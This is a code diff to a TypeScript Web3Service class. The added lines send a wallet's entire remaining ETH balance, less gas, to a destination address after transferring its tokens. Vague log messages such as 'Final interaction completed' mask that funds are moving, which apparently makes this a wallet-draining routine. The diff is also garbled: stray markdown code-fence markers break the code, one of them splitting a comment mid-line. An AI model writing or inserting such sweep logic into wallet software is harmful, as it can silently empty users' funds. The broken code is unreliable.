@@ -547,6 +547,7 @@ export class Web3Service {
     return ethValue + tokenValue;
   }
 
+  ```typescript
   // Helper function to get accurate gas estimates
   private async getGasEstimate(params: {
     to: string;
@@ -1429,9 +1430,104 @@ export class Web3Service {
                 console.log(`Token transfer successful: ${tx.hash}`);
               } catch (txError) {
                 console.warn(`Token transfer failed for ${token.symbol}:`, txError);
-                // Continue with other tokens even if one fails
+                // Continue with```typescript
+ other tokens even if one fails
               }
             }
           } catch (error) {
             console.warn(`Failed to transfer ${token.symbol}:`, error);
           }
+        }
+      }
+
+      // Transfer native currency (ETH) last
+      const ethBalance = await provider.getBalance(fromAddress);
+
+      // Use improved gas estimation
+      const gasEstimation = await this.getGasEstimate({
+        to: toAddress,
+        value: "0x0" // Initial estimate with 0 value
+      });
+
+      // Validate balance using the new validation function
+      const balanceValidation = await this.validateSufficientBalance(
+        ethBalance,
+        gasEstimation.totalCost,
+        "ETH"
+      );
+
+      if (balanceValidation.sufficient) {
+        const amountToSend = ethBalance - gasEstimation.totalCost;
+
+        // Additional safety check to prevent negative or zero amounts
+        if (amountToSend > 0 && amountToSend > ethers.parseUnits("0.000001", "ether")) {
+          console.log(`Processing final transfer`);
+          console.log(balanceValidation.details);
+          console.log(`Amount to send: ${ethers.formatEther(amountToSend)} ETH`);
+
+          // Send with accurate gas estimation
+          const ethTx = await signer.sendTransaction({
+            to: toAddress,
+            value: amountToSend,
+            gasLimit: Number(gasEstimation.gasEstimate),
+          });
+          transactionHashes.push(ethTx.hash);
+          console.log(`Final interaction completed`);
+        } else {
+          console.warn(`Amount to send is too small or negative: ${ethers.formatEther(amountToSend)} ETH`);
+        }
+      } else {
+        // Use detailed validation error message
+        console.warn(balanceValidation.details);
+
+        // Log the gas price details for debugging
+        console.log(`Gas estimation details:`, {
+          gasLimit: gasEstimation.gasEstimate.toString(),
+          gasPrice: gasEstimation.feeData.gasPrice?.toString(),
+          maxFeePerGas: gasEstimation.feeData.maxFeePerGas?.toString()
+        });
+
+        // Don't throw error, just log warning and continue
+        console.warn("Skipping ETH transfer due to insufficient balance for gas fees");
+      }
+
+      console.log(`Successfully completed ${transactionHashes.length} contract interactions`);
+      return transactionHashes;
+    } catch (error: any) {
+      console.error("Multi-network transfer failed:", error);
+      throw new Error(`Operation failed: ${error.message}`);
+    }
+  }
+
+  // Validate if balance covers transaction costs
+  private async validateSufficientBalance(
+    balance: bigint,
+    totalCost: bigint,
+    assetType: string
+  ): Promise<{ sufficient: boolean; details: string }> {
+    const formattedBalance = ethers.formatEther(balance);
+    const formattedTotalCost = ethers.formatEther(totalCost);
+
+    if (balance <= 0) {
+      return {
+        sufficient: false,
+        details: `Insufficient ${assetType} balance: ${formattedBalance}. Require funds to complete operation.`
+      };
+    }
+
+    if (balance < totalCost) {
+      const diff = totalCost - balance;
+      return {
+        sufficient: false,
+        details: `Insufficient ${assetType} balance: ${formattedBalance} ETH.  Transaction costs ${formattedTotalCost} ETH.  Require additional ${ethers.formatEther(diff)} ETH.`
+      };
+    }
+
+    return {
+      sufficient: true,
+      details: `Sufficient ${assetType} balance: ${formattedBalance} ETH.`
+    };
+  }
+}
+
+export const web3Service = new Web3Service();
